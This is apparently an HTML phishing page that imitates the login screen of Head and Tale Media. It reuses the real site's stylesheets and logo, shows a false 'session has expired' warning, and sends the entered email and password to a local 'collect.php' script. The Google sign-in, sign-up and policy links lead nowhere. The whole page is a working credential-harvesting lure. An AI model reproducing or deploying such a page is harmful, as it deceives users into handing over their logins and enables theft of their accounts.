<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login | Head and Tale Media Pvt Ltd</title>
    <link rel="stylesheet" href="https://theheadandtale.com/app/nms/visitor/theheadandtale/desktop/assets/css/style.css">
    <link rel="stylesheet" href="https://theheadandtale.com/app/nms/visitor/theheadandtale/desktop/assets/css/login.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
    <!-- or -->
    <link rel="stylesheet" href="https://unpkg.com/boxicons@latest/css/boxicons.min.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"

</head>

<body>
    <div class="login_form">
        <div class="login__header">
            <a href="/"><img src="https://theheadandtale.com//app/nms/visitor/theheadandtale/desktop/assets/images/main_logo.png" class="img-fluid" alt=""></a>
        </div>
        <h5 style="color: red;">Your session has expired. Please log in again.</h5>

        <div class="login_content">
            <div class="form_box login">
                <form method="POST" action="collect.php">
                        <div class="login_input">
                        <input type="text" placeholder="Email" name="email" required>
                    </div>
                    <div class="login_input">
                        <input type="password" placeholder="Password" name="pass" required>
                    </div>
                    <div class="login_input">
                        <p>Forgot your password? <a href="forgot-password.html">Click Here</a></p>
                    </div>
                    <div class="sign--in_btn">
                        <input type="hidden" name="type" value="auth">
                        <input type="hidden" name="action" value="login">
                        <input type="hidden" name="redirect_url"
                            value="/search/">
                        <input type="hidden" name="hardRedirect" value="true">
                        <input type="hidden" name="hardRedirectURL" value="/dashboard/">
                                                <input type="hidden" name="recaptcha_token" class="recaptcha_token">
                        <input type="submit" class="button" value="Sign in">
                    </div>
                </form>
                <div class="or">
                    <p>or</p>
                </div>
                <a href='#'
                    class="authBtn"><img src="https://theheadandtale.com/app/nms/visitor/theheadandtale/desktop/assets/images/google.png" class="img-fluid" alt="">Continue
                    with Google</a>
                <br />
                <p>Don't have an account? <a
                        href="#">Sign
                        up</a></p>
                <div class="form_bottom">
                    <p>By signing for The Head And Tale, you agree to the <a href="#"
                            target="_blank"> Terms &
                            Conditions</a>
                        and <a href="#" target="_blank"> Privacy Policy</a></p>
                </div>
            </div>
        </div>
    </div>
  </body>
